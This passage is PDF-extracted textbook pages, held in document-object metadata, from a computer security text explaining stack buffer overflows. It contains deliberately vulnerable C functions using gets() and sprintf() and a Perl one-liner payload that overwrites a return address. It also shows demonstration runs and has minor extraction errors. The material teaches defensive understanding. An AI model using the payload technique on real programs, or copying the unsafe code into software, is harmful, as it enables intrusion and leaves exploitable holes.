       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 346, 'page_label': '345'}, page_content='10.1 / STACK OvERflOwS  345\\nof the three example program runs in Figure 10.1b.4 Any other input tag would leave \\nit with the value FALSE. Such a code fragment might be used to parse some struc -\\ntured network protocol interaction or formatted text file.\\nThe problem with this code exists because the traditional C library gets() \\nfunction does not include any checking on the amount of data copied. It will read \\nthe next line of text from the program’s standard input up until the first newline 5 \\ncharacter occurs and copy it into the supplied buffer followed by the NULL termi -\\nnator used with C strings. 6 If more than seven characters are present on the input \\nline, when read in they will (along with the terminating NULL character) require \\n4This and all subsequent examples in this chapter were created using an older Knoppix Linux system run-\\nning on a Pentium processor, using the GNU GCC compiler and GDB debugger.\\n5The newline (NL) or linefeed (LF) character is the standard end of line terminator for UNIX systems, \\nand hence for C, and is the character with the ASCII value 0x0a.\\n6Strings in C are stored in an array of characters and terminated with the NULL character, which has the \\nASCII value 0x00. Any remaining locations in the array are undefined, and typically contain whatever \\nvalue was previously saved in that area of memory. This can be clearly seen in the value of the variable \\nstr2 in the “Before” column of Figure 10.2.\\nFigure 10.2 Basic Buffer Overflow Stack Values\\n01000000\\n . . . .\\n34fcffbf\\n 4 . . .\\n . . . .\\n . . . .\\nc6bd0340\\n . . . @\\n08fcffbf\\n . . . .\\n00000000\\n . . . .\\n80640140\\n . d . @\\n54001540\\n T . . @\\n53544152\\n S T A R\\n00850408\\n . . . .\\n30561540\\nbffffbf0\\nbffffbf4\\n. . . . \\n . . . .\\nbffffbec\\nbffffbe8\\nbffffbe4\\nbffffbe0\\nbffffbdc\\nbffffbd8\\nbffffbd4\\nbffffbd0\\n 0 V . @\\n01000000\\n . . . .\\n34fcffbf\\n 3 . . .\\n. . . .\\nAfter\\ngets(str2)\\nBefore\\ngets(str2)\\nMemory\\nAddress\\n . . . .\\nc6bd0340\\n . . . @\\n08fcffbf\\n . . . .\\n01000000\\n . . . .\\n00640140\\n . d . @\\n4e505554\\n N P U T\\n42414449\\n B A D I\\n4e505554\\n N P U T\\n42414449\\n B A D I\\nargc\\nargv\\nContains\\nvalue of\\nreturn addr\\nold base ptr\\nvalid\\nstr1[4-7]\\nstr1[0-3]\\nstr2[4-7]\\nstr2[0-3]\\nM10_STAL0611_04_GE_C10.indd   345 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 347, 'page_label': '346'}, page_content='346  CHAPTER 10 / BuffER OvERflOw\\nmore room than is available in the str2 buffer. Consequently, the extra characters \\nwill proceed to overwrite the values of the adjacent variable, str1 in this case. For \\nexample, if the input line contained EVILINPUTVALUE, the result will be that str1 \\nwill be overwritten with the characters TVALUE, and str2 will use not only the eight \\ncharacters allocated to it, but seven more from str1 as well. This can be seen in the \\nsecond example run in Figure 10.1b. The overflow has resulted in corruption of a vari-\\nable not directly used to save the input. Because these strings are not equal, valid \\nalso retains the value FALSE. Further, if 16 or more characters were input, additional \\nmemory locations would be overwritten.\\nThe preceding example illustrates the basic behavior of a buffer overflow. \\nAt its simplest, any unchecked copying of data into a buffer could result in cor -\\nruption of adjacent memory locations, which may be other variables, or, as we will \\nsee next,  possibly progr am control addresses and data. Even this simple example \\ncould be taken further. Knowing the structure of the code processing it, an attacker \\ncould arrange for the overwritten value to set the value in str1 equal to the value \\nplaced in str2, resulting in the subsequent comparison succeeding. For example, the \\ninput line could be the string BADINPUTBADINPUT. This results in the comparison \\n succeeding, as shown in the third of the three example program runs in Figure 10.1b \\nand  illustrated in Figure 10.2, with the values of the local variables before and after \\nthe call to gets(). Note also the terminating NULL for the input string was writ -\\nten to the memory location following str1. This means the flow of control in the \\nprogram will continue as if the expected tag was found, when in fact the tag read was \\nsomething completely different. This will almost certainly result in program behavior \\nthat was not intended. How serious is this will depend very much on the logic in the \\nattacked program. One dangerous possibility occurs if instead of being a tag, the \\nvalues in these buffers were an expected and supplied password needed to access \\nprivileged features. If so, the buffer overflow provides the attacker with a means of \\naccessing these features without actually knowing the correct password.\\nTo exploit any type of buffer overflow, such as those we have illustrated here, \\nthe attacker needs:\\n1. To identify a buffer overflow vulnerability in some program that can be \\n triggered using externally sourced data under the attackers control, and\\n2. To understand how that buf fer will be stored in the processes memory, and \\nhence the potential for corrupting adjacent memory locations and potentially \\naltering the flow of execution of the program.\\nIdentifying vulnerable programs may be done by inspection of program source, \\ntracing the execution of programs as they process oversized input, or using tools such \\nas fuzzing, which we will discuss in Section 11.2, to automatically identify potentially \\nvulnerable programs. What the attacker does with the resulting corruption of memory \\nvaries considerably, depending on what values are being overwritten. We will explore \\nsome of the alternatives in the following sections.\\nBefore exploring buffer overflows further, it is worth considering just how the \\npotential for their occurrence developed and why programs are not necessarily pro-\\ntected from such errors. To understand this, we need to briefly consider the history of \\nprogramming languages and the fundamental operation of computer systems. At the \\nbasic machine level, all of the data manipulated by machine instructions executed by \\nM10_STAL0611_04_GE_C10.indd   346 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 348, 'page_label': '347'}, page_content='10.1 / STACK OvERflOwS  347\\nthe computer processor are stored in either the processor’s registers or in memory. \\nThe data are simply arrays of bytes. Their interpretation is entirely determined by the \\nfunction of the instructions accessing them. Some instructions will treat the bytes as \\nrepresenting integer values, others as addresses of data or instructions, and others as \\narrays of characters. There is nothing intrinsic in the registers or memory that indicates \\nthat some locations have an interpretation different from others. Thus, the responsibil-\\nity is placed on the assembly language programmer to ensure that the correct inter-\\npretation is placed on any saved data value. The use of assembly (and hence machine) \\nlanguage programs gives the greatest access to the resources of the computer system, \\nbut at the highest cost and responsibility in coding effort for the programmer.\\nAt the other end of the abstraction spectrum, modern high-level programming \\nlanguages such as Java, ADA, Python, and many others have a very strong notion \\nof the type of variables and what constitutes permissible operations on them. Such \\nlanguages do not suffer from buffer overflows because they do not permit more data \\nto be saved into a buffer than it has space for. The higher levels of abstraction, and \\nsafe usage features of these languages, mean programmers can focus more on solving \\nthe problem at hand and less on managing details of interactions with variables. But \\nthis flexibility and safety comes at a cost in resource use, both at compile time, and in \\nadditional code that must executed at run time to impose checks such as that on buffer \\nlimits. The distance from the underlying machine language and architecture also means \\nthat access to some instructions and hardware resources is lost. This limits their use-\\nfulness in writing code, such as device drivers, that must interact with such resources.\\nIn between these extremes are languages such as C and its derivatives, which \\nhave many modern high-level control structures and data type abstractions but which \\nstill provide the ability to access and manipulate memory data directly. The C program-\\nming language was designed by Dennis Ritchie, at Bell Laboratories, in the early 1970s. \\nIt was used very early to write the UNIX operating system and many of the applica-\\ntions that run on it. Its continued success was due to its ability to access low-level \\nmachine resources while still having the expressiveness of high-level control and data \\nstructures and because it was fairly easily ported to a wide range of processor architec-\\ntures. It is worth noting that UNIX was one of the earliest operating systems written in \\na high-level language. Up until then (and indeed in some cases for many years after), \\noperating systems were typically written in assembly language, which limited them to \\na specific processor architecture. Unfortunately, the ability to access low-level machine \\nresources means that the language is susceptible to inappropriate use of memory con-\\ntents. This was aggravated by the fact that many of the common and widely used library \\nfunctions, especially those relating to input and processing of strings, failed to perform \\nchecks on the size of the buffers being used. Because these functions were common \\nand widely used, and because UNIX and derivative operating systems such as Linux \\nare widely deployed, this means there is a large legacy body of code using these unsafe \\nfunctions, which are thus potentially vulnerable to buffer overflows. We return to this \\nissue when we discuss countermeasures for managing buffer overflows.\\nStack Buffer Overflows\\nA stack buffer overflow occurs when the targeted buffer is located on the stack, usu-\\nally as a local variable in a function’s stack frame. This form of attack is also referred \\nto as stack smashing. Stack buffer overflow attacks have been exploited since first \\nM10_STAL0611_04_GE_C10.indd   347 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 349, 'page_label': '348'}, page_content='348  CHAPTER 10 / BuffER OvERflOw\\nbeing seen in the wild in the Morris Internet Worm in 1988. The exploits it used \\nincluded an unchecked buffer overflow resulting from the use of the C gets() \\nfunction in the fingerd daemon. The publication by Aleph One (Elias Levy) of \\ndetails of the attack and how to exploit it [LEVY96] hastened further use of this \\ntechnique. As indicated in the chapter introduction, stack buffer overflows are still \\nbeing exploited, as new vulnerabilities continue to be discovered in widely deployed \\nsoftware.\\nFunction call MechanisMs To better understand how buffer overflows work, we \\nfirst take a brief digression into the mechanisms used by program functions to manage \\ntheir local state on each call. When one function calls another, at the very least it needs \\nsomewhere to save the return address so the called function can return control when \\nit finishes. Aside from that, it also needs locations to save the parameters to be passed \\nin to the called function, and also possibly to save register values that it wishes to \\ncontinue using when the called function returns. All of these data are usually saved \\non the stack in a structure known as a stack frame. The called function also needs \\nlocations to save its local variables, somewhere different for every call so it is possible \\nfor a function to call itself either directly or indirectly. This is known as a recursive \\nfunction call.7 In most modern languages, including C, local variables are also stored \\nin the function’s stack frame. One further piece of information then needed is some \\nmeans of chaining these frames together, so as a function is exiting it can restore the \\nstack frame for the calling function before transferring control to the return address. \\n Figure\\xa0 10.3 illustrates such a stack frame structure. The general process of one \\n7Though early programming languages such as Fortran did not do this, and as a consequence Fortran \\nfunctions could not be called recursively.\\nFigure 10.3 Example Stack Frame with Functions P and Q\\nP:\\nQ:\\nReturn addr\\nReturn addr in P\\nOld frame pointer\\nOld frame pointer Frame\\npointer\\nStack\\npointer\\nparam 2\\nparam 1\\nlocal 1\\nlocal 2\\nM10_STAL0611_04_GE_C10.indd   348 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 350, 'page_label': '349'}, page_content='10.1 / STACK OvERflOwS  349\\nfunction P calling another function Q can be summarized as follows. The calling \\n function P:\\n1. Pushes the parameters for the called function onto the stack (typically in \\nreverse order of declaration).\\n2. Executes the call instruction to call the target function, which pushes the return \\naddress onto the stack.\\nThe called function Q:\\n3. Pushes the current frame pointer value (which points to the calling routine’s \\nstack frame) onto the stack.\\n4. Sets the frame pointer to be the current stack pointer value (i.e., the address of \\nthe old frame pointer), which now identifies the new stack frame location for the \\ncalled function.\\n5. Allocates space for local variables by moving the stack pointer down to lea ve \\nsufficient room for them.\\n6. Runs the body of the called function.\\n7. As it exits, it first sets the stack pointer back to the value of the frame pointer \\n(effectively discarding the space used by local variables).\\n8. Pops the old fr ame pointer value (restoring the link to the calling routine’s \\nstack frame).\\n9. Executes the return instruction which pops the saved address off the stack and \\nreturns control to the calling function.\\nLastly, the calling function:\\n10. Pops the parameters for the called function off the stack.\\n11. Continues execution with the instruction following the function call.\\nAs has been indicated before, the precise implementation of these steps is language, \\ncompiler, and processor architecture dependent. However, something similar will usu-\\nally be found in most cases. In addition, not specified here are steps involving saving \\nregisters used by the calling or called functions. These generally happen either before \\nthe parameter pushing if done by the calling function, or after the allocation of space \\nfor local variables if done by the called function. In either case, this does not affect the \\noperation of buffer overflows we will discuss next. More detail on function call and return \\nmechanisms and the structure and use of stack frames may be found in [STAL16b].\\nstack overFlow exaMple With the preceding background, consider the effect of \\nthe basic buffer overflow introduced in Section 10.1. Because the local variables are \\nplaced below the saved frame pointer and return address, the possibility exists of exploit-\\ning a local buffer variable overflow vulnerability to overwrite the values of one or both \\nof these key function linkage values. Note that the local variables are usually allocated \\nspace in the stack frame in order of declaration, growing down in memory with the top \\nof stack. Compiler optimization can potentially change this, so the actual layout will \\nneed to be determined for any specific program of interest. This possibility of overwrit-\\ning the saved frame pointer and return address forms the core of a stack overflow attack.\\nM10_STAL0611_04_GE_C10.indd   349 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 351, 'page_label': '350'}, page_content='350  CHAPTER 10 / BuffER OvERflOw\\nAt this point, it is useful to step back and take a somewhat wider view of a \\nrunning program, and the placement of key regions such as the program code, global \\ndata, heap, and stack. When a program is run, the operating system typically creates \\na new process for it. The process is given its own virtual address space, with a general \\nstructure as shown in Figure 10.4. This consists of the contents of the executable \\nprogram file (including global data, relocation table, and actual program code seg -\\nments) near the bottom of this address space, space for the program heap to then \\ngrow upward from above the code, and room for the stack to grow down from near \\nthe middle (if room is reserved for kernel space in the upper half) or top. The stack \\nframes we discussed are hence placed one below another in the stack area, as the \\nstack grows downward through memory. We return to discuss some of the other \\ncomponents later. Further details on the layout of a process address space may be \\nfound in [STAL16c].\\nFigure 10.4 Program Loading into Process Memory\\nGlobal data Global data\\nHeap\\nSpare\\nmemory\\nStack\\nKernel\\ncode\\nand\\ndata\\nTop of memory\\nProcess image in\\nmain memory\\nProgram f ile\\nProgram\\nmachine\\ncode\\nProgram\\nmachine\\ncode\\nProcess control block\\nBottom of memory\\nM10_STAL0611_04_GE_C10.indd   350 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 352, 'page_label': '351'}, page_content='10.1 / STACK OvERflOwS  351\\nTo illustrate the operation of a classic stack overflow, consider the C func -\\ntion given in Figure 10.5a. It contains a single local variable, the buffer inp. This \\nis saved in the stack frame for this function, located somewhere below the saved \\nframe pointer and return address, as shown in Figure 10.6. This hello function (a \\nversion of the classic Hello World program) prompts for a name, which it then reads \\ninto the buffer inp using the unsafe gets() library routine. It then displays the \\nvalue read using the printf() library routine. As long as a small value is read in, \\nthere will be no problems and the program calling this function will run success -\\nfully, as shown in the first of the example program runs in Figure 10.5b. However, \\nif the data input is too much, as shown in the second example program of Figure \\n10.5b, then the data extend beyond the end of the buffer and ends up overwriting \\nthe saved frame pointer and return address with garbage values (corresponding \\nto the binary representation of the characters supplied). Then, when the function \\nattempts to transfer control to the return address, it typically jumps to an illegal \\nmemory location, resulting in a Segmentation Fault and the abnormal termination \\nvoid hello(char *tag)\\n{\\n    char inp[16];\\n    printf(\"Enter value for %s: \", tag);\\n    gets(inp);\\n    printf(\"Hello your %s is %s\\\\n\", tag, inp);\\n}\\nFigure 10.5 Basic Stack Overflow Example\\n(a) Basic stack overflow C code\\n(b) Basic stack overflow example runs\\n$ cc -g -o buffer2 buffer2.c\\n$ ./buffer2\\nEnter value for name: Bill and Lawrie\\nHello your name is Bill and Lawrie\\nbuffer2 done\\n$ ./buffer2\\nEnter value for name: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\\nSegmentation fault (core dumped)\\n$ perl -e \\'print pack(\"H*\", \"414243444546474851525354555657586162636465666768\\ne8ffffbf948304080a4e4e4e4e0a\");\\' | ./buffer2\\nEnter value for name:\\nHello your Re?pyy]uEA is ABCDEFGHQRSTUVWXabcdefguyu\\nEnter value for Kyyu:\\nHello your Kyyu is NNNN\\nSegmentation fault (core dumped)\\nM10_STAL0611_04_GE_C10.indd   351 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 353, 'page_label': '352'}, page_content='352  CHAPTER 10 / BuffER OvERflOw\\nof the program, as shown. Just supplying random input like this, leading typically \\nto the program crashing, demonstrates the basic stack overflow attack. And since \\nthe program has crashed, it can no longer supply the function or service for which \\nit was running. At its simplest, then, a stack overflow can result in some form of \\ndenial-of-service attack on a system.\\nOf more interest to the attacker, rather than immediately crashing the program, \\nis to have it transfer control to a location and code of the attacker’s choosing. The \\nsimplest way of doing this is for the input causing the buffer overflow to contain the \\ndesired target address at the point where it will overwrite the saved return address \\nin the stack frame. Then, when the attacked function finishes and executes the return \\ninstruction, instead of returning to the calling function, it will jump to the supplied \\naddress instead and execute instructions from there.\\nWe can illustrate this process using the same example function shown in  \\nFigure 10.5a. Specifically, we can show how a buffer overflow can cause it to start \\nre-executing the hello function, rather than returning to the calling main routine. \\nTo do this, we need to find the address at which the hello function will be loaded. \\nRemember from our discussion of process creation, when a program is run, the code \\nand global data from the program file are copied into the process virtual address \\nspace in a standard manner. Hence, the code will always be placed at the same loca-\\ntion. The easiest way to determine this is to run a debugger on the target program \\nand disassemble the target function. When done with the example program contain-\\ning the hello function on the Knoppix system being used, the hello function was \\nFigure 10.6 Basic Stack Overflow Stack Values\\nf0830408\\n . . . .\\n3e850408\\n > . . .\\n . . . .\\n . . . .\\ne8fbffbf\\n . . . .\\n60840408\\n ` . . .\\n30561540\\n 0 V . @\\n1b840408\\n . . . .\\ne8fbffbf\\n . . . .\\n3cfcffbf\\n < . . .\\n34fcffbf\\n 4 . . .\\nbffffbdc\\nbffffbe0\\n. . . . \\n . . . .\\nbffffbd8\\nbffffbd4\\nbffffbd0\\nbffffbcc\\nbffffbc8\\nbffffbc4\\nbffffbc0\\n94830408\\n . . . .\\n00850408\\n . . . .\\n. . . .\\nAfter\\ngets(inp)\\nBefore\\ngets(inp)\\nMemory\\nAddress\\n . . . .\\ne8ffffbf\\n . . . .\\n65666768\\n e f g h\\n61626364\\n a b c d\\n55565758\\n U V W X\\n51525354\\n Q R S T\\n45464748\\n E F G H\\n41424344\\n A B C D\\nreturn addr\\ntag\\nContains\\nvalue of\\nold base ptr\\ninp[12-15]\\ninp[8-11]\\ninp[4-7]\\ninp[0-3]\\nM10_STAL0611_04_GE_C10.indd   352 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 354, 'page_label': '353'}, page_content='10.1 / STACK OvERflOwS  353\\nlocated at address 0x08048394. So, this value must overwrite the return address \\nlocation. At the same time, inspection of the code revealed that the buffer inp was \\nlocated 24 bytes below the current frame pointer. This means 24 bytes of content \\nare needed to fill the buffer up to the saved frame pointer. For the purpose of this \\nexample, the string ABCDEFGHQRSTUVWXabcdefgh was used. Lastly, in order to \\noverwrite the return address, the saved frame pointer must also be overwritten with \\nsome valid memory value (because otherwise any use of it following its restoration \\ninto the current frame register would result in the program crashing). For this dem-\\nonstration, a (fairly arbitrary) value of 0xbfffffe8 was chosen as being a suitable \\nnearby location on the stack. One further complexity occurs because the Pentium \\narchitecture uses a little-endian representation of numbers. That means for a 4-byte \\nvalue, such as the addresses we are discussing here, the bytes must be copied into \\nmemory with the lowest byte first, then next lowest, finishing with the highest last. \\nThat means the target address of 0x08048394 must be ordered in the buffer as  \\n94 83 04 08. The same must be done for the saved frame pointer address. Because \\nthe aim of this attack is to cause the hello function to be called again, a second line \\nof input is included for it to read on the second run, namely the string NNNN, along \\nwith newline characters at the end of each line.\\nSo, now we have determined the bytes needed to form the buffer overflow \\nattack. One last complexity is that the values needed to form the target addresses do \\nnot all correspond to printable characters. So, some way is needed to generate an \\nappropriate binary sequence to input to the target program. Typically, this will be \\nspecified in hexadecimal, which must then be converted to binary, usually by some \\nlittle program. For the purpose of this demonstration, we use a simple one-line Perl8 \\nprogram, whose pack() function can be easily used to convert a hexadecimal string \\ninto its binary equivalent, as can be seen in the third of the example program runs in \\nFigure 10.5b. Combining all the elements listed above results in the hexadecimal \\nstring 414243444546474851525354555657586162636465666768e8fff \\nfbf948304080a4e4e4e4e0a, which is converted to binary and written by the Perl \\nprogram. This output is then piped into the targeted buffer2 program, with the \\nresults as shown in Figure 10.5b. Note that the prompt and display of read values is \\nrepeated twice, showing that the function hello has indeed been reentered. How-\\never, as by now the stack frame is no longer valid, when it attempts to return a second \\ntime it jumps to an illegal memory location, and the program crashes. But it has done \\nwhat the attacker wanted first! There are a couple of other points to note in this \\nexample. Although the supplied tag value was correct in the first prompt, by the time \\nthe response was displayed, it had been corrupted. This was due to the final NULL \\ncharacter used to terminate the input string being written to the memory location \\njust past the return address, where the address of the tag parameter was located. So, \\nsome random memory bytes were used instead of the actual value. When the hello \\nfunction was run the second time, the tag parameter was referenced relative to the \\narbitrary, random, overwritten saved frame pointer value, which is some location in \\nupper memory, hence the garbage string seen.\\n8Perl—the Practical Extraction and Report Language—is a very widely used interpreted scripting lan -\\nguage. It is usually installed by default on UNIX, Linux, and derivative systems and is available for most \\nother operating systems.\\nM10_STAL0611_04_GE_C10.indd   353 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 355, 'page_label': '354'}, page_content='354  CHAPTER 10 / BuffER OvERflOw\\nThe attack process is further illustrated in Figure 10.6, which shows the values \\nof the stack frame, including the local buffer inp before and after the call to gets(). \\nLooking at the stack frame before this call, we see that the buffer inp contains gar-\\nbage values, being whatever was in memory before. The saved frame pointer value \\nis 0xbffffbe8, and the return address is 0x080483f0. After the gets() call, the \\nbuffer inp contained the string of letters specified above, the saved frame pointer \\nbecame 0xbfffffe8, and the return address was 0x08048394, exactly as we speci-\\nfied in our attack string. Note also how the bottom byte of the tag parameter was \\ncorrupted, by being changed to 0x00, the trailing NULL character mentioned previ-\\nously. Clearly, the attack worked as designed.\\nHaving seen how the basic stack overflow attack works, consider how it could \\nbe made more sophisticated. Clearly, the attacker can overwrite the return address \\nwith any desired value, not just the address of the targeted function. It could be the \\naddress of any function, or indeed of any sequence of machine instructions present \\nin the program or its associated system libraries. We will explore this variant in a \\nlater section. However, the approach used in the original attacks was to include the \\ndesired machine code in the buffer being overflowed. That is, instead of the sequence \\nof letters used as padding in the example above, binary values corresponding to the \\ndesired machine instructions were used. This code is known as shellcode, and we will \\ndiscuss its creation in more detail shortly. In this case, the return address used in the \\nattack is the starting address of this shellcode, which is a location in the middle of the \\ntargeted function’s stack frame. So, when the attacked function returns, the result is \\nto execute machine code of the attacker’s choosing.\\nMore stack overFlow vulnerabilities Before looking at the design of shell-\\ncode, there are a few more things to note about the structure of the functions targeted \\nwith a buffer overflow attack. In all the examples used so far, the buffer overflow has \\noccurred when the input was read. This was the approach taken in early buffer over-\\nflow attacks, such as in the Morris Worm. However, the potential for a buffer overflow \\nexists anywhere that data is copied or merged into a buffer, where at least some of \\nthe data are read from outside the program. If the program does not check to ensure \\nthe buffer is large enough, or the data copied are correctly terminated, then a buffer \\noverflow can occur. The possibility also exists that a program can safely read and \\nsave input, pass it around the program, then at some later time in another function \\nunsafely copy it, resulting in a buffer overflow. Figure 10.7a shows an example pro-\\ngram illustrating this behavior. The main() function includes the buffer buf. This is \\npassed along with its size to the function getinp(), which safely reads a value using \\nthe fgets() library routine. This routine guarantees to read no more characters than \\none less than the buffers size, allowing room for the trailing NULL. The getinp() \\nfunction then returns to main(), which then calls the function display() with \\nthe value in buf. This function constructs a response string in a second local buffer \\ncalled tmp and then displays this. Unfortunately, the sprintf() library routine is \\nanother common, unsafe C library routine that fails to check that it does not write \\ntoo much data into the destination buffer. Note in this program that the buffers are \\nboth the same size. This is a quite common practice in C programs, although they are \\nusually rather larger than those used in these example programs. Indeed, the standard \\nC IO library has a defined constant BUFSIZ, which is the default size of the input \\nM10_STAL0611_04_GE_C10.indd   354 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 356, 'page_label': '355'}, page_content='10.1 / STACK OvERflOwS  355\\nvoid gctinp(ohar *inp, int siz)\\n{\\n    puts(\"Input value: \");\\n    fgets(inp, siz, stdin);\\n    printf(\"buffer3 getinp read %s\\\\n\", inp);\\n}\\nvoid display(char *val)\\n{\\n    char tmp[16];\\n    sprintf(tmp, \"read val: %s\\\\n\", val);\\n    puts(tmp);\\n}\\nint main(int argc, char *argv[])\\n{\\n    char buf[16];\\n    getinp (buf, sizeof (buf));\\n    display(buf);\\n    printf(\"buffer3 done\\\\n\");\\n}\\nFigure 10.7 Another Stack Overflow Example\\n(a) Another stack overflow C code\\n(b) Another stack overflow example runs\\n$ cc -o buffer3 buffer3.c\\n$ ./buffer3\\nInput value:\\nSAFE\\nbuffer3 getinp read SAFE\\nread val: SAFE\\nbuffer3 done\\n$ ./buffer3\\nInput value:\\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\\nbuffer3 getinp read XXXXXXXXXXXXXXX\\nread val: XXXXXXXXXXXXXXX\\nbuffer3 done\\nSegmentation fault (core dumped)\\nbuffers it uses. This same constant is often used in C programs as the standard size of \\nan input buffer. The problem that may result, as it does in this example, occurs when \\ndata are being merged into a buffer that includes the contents of another buffer, such \\nthat the space needed exceeds the space available. Look at the example runs of this \\nprogram shown in Figure 10.7b. For the first run, the value read is small enough that \\nM10_STAL0611_04_GE_C10.indd   355 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 357, 'page_label': '356'}, page_content='356  CHAPTER 10 / BuffER OvERflOw\\ngets(char *str) read line from standard input into str\\nsprintf(char *str, char *format,\\xa0...) create str according to supplied format and variables\\nstrcat(char *dest, char *src) append contents of string src to string dest\\nstrcpy(char *dest, char *src) copy contents of string src to string dest\\nvsprintf(char *str, char *fmt, va_list ap) create str according to supplied format and variables\\nTable 10.2 Some Common Unsafe C Standard Library Routines\\nthe merged response did not corrupt the stack frame. For the second run, the supplied \\ninput was much too large. However, because a safe input function was used, only \\n15\\xa0characters were read, as shown in the following line. When this was then merged \\nwith the response string, the result was larger than the space available in the destina-\\ntion buffer. In fact, it overwrote the saved frame pointer, but not the return address. \\nSo the function returned, as shown by the message printed by the main() function. \\nBut when main() tried to return, because its stack frame had been corrupted and \\nwas now some random value, the program jumped to an illegal address and crashed. \\nIn this case, the combined result was not long enough to reach the return address, but \\nthis would be possible if a larger buffer size had been used.\\nThis shows that when looking for buffer overflows, all possible places where \\nexternally sourced data are copied or merged have to be located. Note these do not \\neven have to be in the code for a particular program, they can (and indeed do) occur \\nin 